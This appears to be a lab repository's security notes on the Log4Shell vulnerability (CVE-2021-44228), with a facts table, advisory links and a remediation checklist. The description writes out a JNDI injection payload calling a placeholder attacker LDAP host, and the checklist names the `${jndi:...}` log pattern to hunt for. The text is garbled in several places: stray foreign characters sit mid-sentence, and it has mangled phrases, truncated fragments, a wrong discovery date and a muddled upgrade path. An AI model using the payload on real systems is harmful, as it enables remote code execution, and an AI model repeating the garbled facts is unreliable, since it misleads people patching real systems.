# Log4Shell (CVE-2021-44228) — Security Notes

Tracker repo for this quarter's lab security briefing.

## What Log4Shell actually is

Log4Shell is a **critical, remotely exploitable remote code execution (RCE) flaw**
discovered in late December 2021 in the **Apache Log4j2** logging library.
An attacker who can influence log messages (or log-message parameters) can trigger
**JNDI lookups (e.g. `${jndi:ldap://attackeripid/a}`)** that cause the application
to connect to an attacker-controlled LDAP/JNDI server, which can return code that is
loaded remotely and executed on the target host. It is砂风吹草动 possible via
HTTP and other headers on many public-facing Java services.

## The facts (verifiable against primary sources)

| Fact | Value |
| --- | --- |
| Name | Log4Shell (also: LogjShell, Log4j zero-day) |
| CVE identifier | **CVE-2021-44228** |
| Affected artifact | Apache **log4j-core** (Java); the `log4j-api` JAR is not affected |
| Affected versions | **2.0-beta9 through 2.14.1** |
| Fixed version | **2.15.0** |
| Secure degraded version | **2.16.0 (Java 8+)** — JNDI lookup functionality fully removed; **2.12.2** (Java 7) / **2.3.1** (Java 6) |
| Recommended target | **2.17.1** or the current 2.x release (CGA, 2021-12-15) |
| Severity | **CVSS 3.x base score 10.0 — CRITICAL** (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| Exposure scope | JNDI/RMI and other JNDI-related endpoints; drives of RCE and DoS |

Notes on patch status: 2.15.0 fixes the trigger but restricts non-default configurations
incomplete (see CVE-2021-45046); 2.16.0/2.17.1 remove the functionality entirely. Log4j 1
has been end-of-life since August 2015 and receives no critical patches — upgrade it.

## Sources

Primary and authoritative:
1. **NVD — CVE-2021-44228**: https://nvd.nist.gov/vuln/detail/cve-2021-44228
   (CVSS 10.0 CRITICAL, affected: 2.0-beta9–2.14.1, fixed in 2.15.0; also lists 45046/45105/44832 following CVEs)
2. **Apache Logging Services Security page**: https://logging.apache.org/security.html
   ([CVE-2021-45046](https://logging.apache.org/security.html))
3. **ASF blog update** (2021-12-14): https://news.apache.org/foundation/entry/apache-log4j-cves
4. **Broadcom ASM Security Advisory** for CVE-2021-44228: https://knowledge.broadcom.com/external/article?articleId=230401
5. **FortiGuard Labs Threat Signal Report** (log4shell CVE-2021-44228): https://fortiguard.fortinet.com/threat-signal-report/4335
6. **CISA/ACSC 2021-007 advisory** (2021-12-15) — mitigations incl. disabling JNDI: https://www.cyber.gov.au/advisory/2021-007-log4j-vulnerability-advice-and-mitigations

Third-party tooling/quarantine context (for supply-chain scanning):
7. **OWASP dep-scan**: https://owasp.org/projects/dep-scan
8. **JFrog OSS Security Research (log4shell_xray_wrapper / env_verify)**: https://research.jfrog.com/oss/
9. **IntegralADS dependency-deep-scan-utilities**: https://github.com/integralads/dependency-deep-scan-utilities
10. **CIS-CAT / CIS guidance** referenced in the hardening issue (formatMsgNoLookups).

## How we will remediate (linked issues)

Sub-issues under the parent tracking issue ["Log4Shell remediation checklist"](./issues/1) in this repo:
- **Upgrade path**: Log4j 2.0-beta9 → 2.3.1 / 2.12.2 / 2.15.0 by Java version; full remediation to 2.16.0+ (target 2.17.1)
- **Detect vulnerable deployments**: hunt for `${jndi:...}` in logs, scan artifacts for `JndiLookup.class`
- **Harden by disabling/removing JNDI lookups**: `log4j2.enableJndi` / log4j2.formatMsgNoLookups, unlimited custom...y (net) egress; confirmed by MS Defender and introspec...y
- **Automated dependency scanning**: CI SCA gates, SBOM from Maven/Gradle dia...de
